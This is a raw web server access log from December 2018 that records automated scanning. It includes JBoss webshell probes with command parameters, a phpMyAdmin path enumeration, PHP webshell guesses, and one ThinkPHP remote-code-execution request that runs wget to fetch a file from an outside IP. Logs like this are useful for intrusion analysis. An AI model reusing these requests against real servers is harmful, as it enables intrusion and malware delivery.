61.19.114.22 - - [14/Dec/2018:09:11:22 +0000] "POST /MCLi.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:22 +0000] "POST /MCLi.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:22 +0000] "POST /51.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:23 +0000] "POST /cadre.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:23 +0000] "POST /mm.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:23 +0000] "POST /test.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:23 +0000] "POST /1q.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:24 +0000] "GET /jexsw2/jexsw2.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:24 +0000] "GET /jexws2/jexws2.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:24 +0000] "GET /jexws3/jexws3.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:24 +0000] "GET /jexws4/jexws4.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:25 +0000] "GET /jexinv/jexinv.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:25 +0000] "GET /jexinv3/jexinv3.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:25 +0000] "GET /jexinv4/jexinv4.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:25 +0000] "GET /jbossass/jbossass.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jexboss"
61.19.114.22 - - [14/Dec/2018:09:11:26 +0000] "GET /console/jspzxc.jsp?cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:26 +0000] "GET /demo/404.jsp?bjh=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:26 +0000] "GET /dread/lock.jsp?tezaz=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:26 +0000] "GET /HCEGH/xunfeng.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:27 +0000] "GET /jbws/jbws.jsp?eval=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jbosses"
61.19.114.22 - - [14/Dec/2018:09:11:27 +0000] "GET /jvrx/cmd.jsp?pwd=everymorning&cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:27 +0000] "GET /shellinvoker/shellinvoker.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jexboss"
61.19.114.22 - - [14/Dec/2018:09:11:27 +0000] "GET /zecmd/zecmd.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:28 +0000] "GET /iesvc/iesvc.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:28 +0000] "GET /idssvc/idssvc.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:28 +0000] "GET /wstats/wstats.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:28 +0000] "GET /a/pwn.jsp?cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
61.19.114.22 - - [14/Dec/2018:09:11:29 +0000] "GET /index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:29 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:29 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:29 +0000] "GET /pmd/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:30 +0000] "GET /pma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:30 +0000] "GET /PMA/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:30 +0000] "GET /PMA2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:30 +0000] "GET /pmamy/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:31 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:31 +0000] "GET /mysql/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:31 +0000] "GET /admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:31 +0000] "GET /db/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:32 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:32 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:32 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:32 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:33 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:33 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:33 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:33 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:34 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:34 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:34 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:34 +0000] "GET /mysql_admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:35 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:35 +0000] "GET /phpAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:35 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:35 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:36 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:36 +0000] "GET /phpMyAdmin-4.4.0/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:36 +0000] "GET /myadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:36 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:37 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:37 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:37 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:37 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:38 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:38 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:38 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:38 +0000] "GET /pma-old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:39 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:39 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:39 +0000] "GET /phpma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:39 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:40 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:40 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:40 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:41 +0000] "GET /phpMyAdmin+++---/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:41 +0000] "GET /v/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:41 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:41 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:42 +0000] "GET /shaAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:42 +0000] "GET /phpMyadmi/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:42 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:43 +0000] "GET /MyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:43 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:43 +0000] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:43 +0000] "GET /pwd/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:44 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:44 +0000] "GET /program/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:44 +0000] "GET /shopdb/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:44 +0000] "GET /phppma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:45 +0000] "GET /phpmy/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:45 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:45 +0000] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:45 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:46 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:46 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
61.19.114.22 - - [14/Dec/2018:09:11:46 +0000] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 178 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/45.0"
61.19.114.22 - - [14/Dec/2018:09:11:47 +0000] "GET /manager/html HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
47.104.107.134 - - [14/Dec/2018:09:54:25 +0000] "PROPFIND / HTTP/1.1" 405 182 "-" "-"
47.104.107.134 - - [14/Dec/2018:09:54:26 +0000] "GET /webdav/ HTTP/1.1" 404 178 "-" "-"
47.104.107.134 - - [14/Dec/2018:09:54:27 +0000] "POST /wuwu11.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:27 +0000] "POST /xw.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:28 +0000] "POST /xx.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:28 +0000] "POST /s.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:30 +0000] "POST /w.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:30 +0000] "POST /db.init.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:31 +0000] "POST /db_session.init.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
47.104.107.134 - - [14/Dec/2018:09:54:31 +0000] "POST /sheep.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
27.2.136.95 - - [14/Dec/2018:09:57:31 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
27.2.136.95 - - [14/Dec/2018:09:57:34 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
27.2.136.95 - - [14/Dec/2018:09:57:42 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
27.2.136.95 - - [14/Dec/2018:09:57:47 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
27.2.136.95 - - [14/Dec/2018:09:58:03 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
220.134.136.154 - - [14/Dec/2018:09:58:11 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
178.208.91.227 - - [14/Dec/2018:10:25:18 +0000] "GET http://82.146.38.46:8080/prox_ch.php HTTP/1.1" 404 178 "-" "-"
185.95.228.10 - - [14/Dec/2018:10:37:44 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
114.32.139.140 - - [14/Dec/2018:11:03:21 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
192.99.35.135 - - [14/Dec/2018:11:11:04 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
118.163.167.226 - - [14/Dec/2018:11:30:04 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
5.26.195.219 - - [14/Dec/2018:12:27:50 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
177.94.189.137 - - [14/Dec/2018:12:39:19 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
122.100.76.92 - - [14/Dec/2018:12:49:10 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
169.1.95.230 - - [14/Dec/2018:12:55:11 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
93.186.65.113 - - [14/Dec/2018:14:04:10 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
122.116.216.42 - - [14/Dec/2018:14:06:56 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
5.8.54.27 - - [14/Dec/2018:14:31:47 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%2046.30.43.159:81/zzt HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
172.104.108.109 - - [14/Dec/2018:14:53:21 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
123.204.47.240 - - [14/Dec/2018:15:45:04 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
36.74.213.136 - - [14/Dec/2018:17:01:53 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
14.247.252.136 - - [14/Dec/2018:17:05:17 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
188.3.89.183 - - [14/Dec/2018:17:08:34 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
220.132.53.7 - - [14/Dec/2018:17:20:38 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
177.68.118.246 - - [14/Dec/2018:17:29:34 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
78.26.141.102 - - [14/Dec/2018:17:30:32 +0000] "GET /musicbox_ott/0/index.m3u8 HTTP/1.1" 404 178 "-" "Xenu Link Sleuth/1.3.8"
78.26.141.102 - - [14/Dec/2018:17:30:32 +0000] "GET /musicbox_ott/0/index.m3u8 HTTP/1.1" 404 178 "-" "Xenu Link Sleuth/1.3.8"
